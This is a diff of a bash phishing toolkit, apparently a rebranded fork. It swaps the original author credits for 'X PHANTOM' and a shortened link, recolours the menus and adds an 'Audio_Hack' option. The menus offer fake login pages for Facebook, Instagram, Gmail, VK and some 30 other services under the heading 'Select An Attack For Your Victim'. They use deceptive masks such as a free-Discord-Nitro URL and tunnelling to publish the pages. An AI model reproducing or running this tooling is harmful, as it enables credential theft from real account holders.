@@ -178,14 +178,13 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
+		${GREEN}Author   ${RED}:  ${ORANGE}X PHANTOM ${RED}[ ${ORANGE}X PH4N70M ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/XPH4N70M 
+		${GREEN}Join us  ${RED}:  ${CYAN}https://bit.ly/3wiPUko
 		${GREEN}Version  ${RED}:  ${ORANGE}2.2
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,AliMilani ${RESETBG}
-
+		${REDBG}${WHITE} Thanks : X PHANTOM,X PH4N70M ${RESETBG}
+								  
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
 		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
@@ -319,12 +318,12 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
+		${RED}[${WHITE}01${RED}]${CYAN} Localhost    ${RED}[${ORANGE}For Devs${RED}]
+		${RED}[${WHITE}03${RED}]${CYAN} Cloudflared  ${RED}[${ORANGE}NEW!${RED}]
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select a port forwarding service : ${GREEN}"
 
 	case $REPLY in 
 		1 | 01)
@@ -342,14 +341,14 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${RED}[${WHITE}01${RED}]${CYAN} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Advanced Voting Poll Login Page
+		${RED}[${WHITE}03${RED}]${CYAN} Fake Security Login Page
+		${RED}[${WHITE}04${RED}]${CYAN} Facebook Messenger Login Page
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${GREEN}"
 
 	case $REPLY in 
 		1 | 01)
@@ -378,14 +377,14 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}01${RED}]${CYAN} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Auto Followers Login Page
+		${RED}[${WHITE}03${RED}]${CYAN} 1000 Followers Login Page
+		${RED}[${WHITE}04${RED}]${CYAN} Blue Badge Verify Login Page
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${GREEN}"
 
 	case $REPLY in 
 		1 | 01)
@@ -414,13 +413,13 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${RED}[${WHITE}01${RED}]${CYAN} Gmail Old Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Gmail New Login Page
+		${RED}[${WHITE}03${RED}]${CYAN} Advanced Voting Poll
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${GREEN}"
 
 	case $REPLY in 
 		1 | 01)
@@ -445,12 +444,12 @@ site_gmail() {
 site_vk() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}01${RED}]${CYAN} Traditional Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Advanced Voting Poll Login Page
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${GREEN}"
 
 	case $REPLY in 
 		1 | 01)
@@ -471,26 +470,26 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${CYAN Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${CYAN}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord
+		${RED}[${WHITE}01${RED}]${CYAN} Facebook      ${RED}[${WHITE}11${RED}]${CYAN} Twitch       ${RED}[${WHITE}21${RED}]${CYAN} DeviantArt
+		${RED}[${WHITE}02${RED}]${CYAN} Instagram     ${RED}[${WHITE}12${RED}]${CYAN} Pinterest    ${RED}[${WHITE}22${RED}]${CYAN} Badoo
+		${RED}[${WHITE}03${RED}]${CYAN} Google        ${RED}[${WHITE}13${RED}]${CYAN} Snapchat     ${RED}[${WHITE}23${RED}]${CYAN} Origin
+		${RED}[${WHITE}04${RED}]${CYAN} Microsoft     ${RED}[${WHITE}14${RED}]${CYAN} Linkedin     ${RED}[${WHITE}24${RED}]${CYAN} DropBox	
+		${RED}[${WHITE}05${RED}]${CYAN} Netflix       ${RED}[${WHITE}15${RED}]${CYAN} Ebay         ${RED}[${WHITE}25${RED}]${CYAN} Yahoo		
+		${RED}[${WHITE}06${RED}]${CYAN} Paypal        ${RED}[${WHITE}16${RED}]${CYAN} Quora        ${RED}[${WHITE}26${RED}]${CYAN} Wordpress
+		${RED}[${WHITE}07${RED}]${CYAN} Steam         ${RED}[${WHITE}17${RED}]${CYAN} Protonmail   ${RED}[${WHITE}27${RED}]${CYAN} Yandex			
+		${RED}[${WHITE}08${RED}]${CYAN} Twitter       ${RED}[${WHITE}18${RED}]${CYAN} Spotify      ${RED}[${WHITE}28${RED}]${CYAN} StackoverFlow
+		${RED}[${WHITE}09${RED}]${CYAN} Playstation   ${RED}[${WHITE}19${RED}]${CYAN} Reddit       ${RED}[${WHITE}29${RED}]${CYAN} Vk
+		${RED}[${WHITE}10${RED}]${CYAN} Tiktok        ${RED}[${WHITE}20${RED}]${CYAN} Adobe        ${RED}[${WHITE}30${RED}]${CYAN} XBOX
+		${RED}[${WHITE}31${RED}]${CYAN} Mediafire     ${RED}[${WHITE}32${RED}]${CYAN} Gitlab       ${RED}[${WHITE}33${RED}]${CYAN} Github
+		${RED}[${WHITE}34${RED}]${CYAN} Discord       ${RED}[${WHITE}35${RED}]${CYAN} Audio_Hack   
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${CYAN} About         ${RED}[${WHITE}00${RED}]${CYAN} Exit
 
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${GREEN}"
 
 	case $REPLY in 
 		1 | 01)
@@ -621,6 +620,7 @@ main_menu() {
 			website="discord"
 			mask='http://get-discord-nitro-free'
 			tunnel_menu;;
+		
 		99)
 			about;;
 		0 | 00 )
@@ -635,6 +635,5 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
-install_ngrok
 install_cloudflared
 main_menu
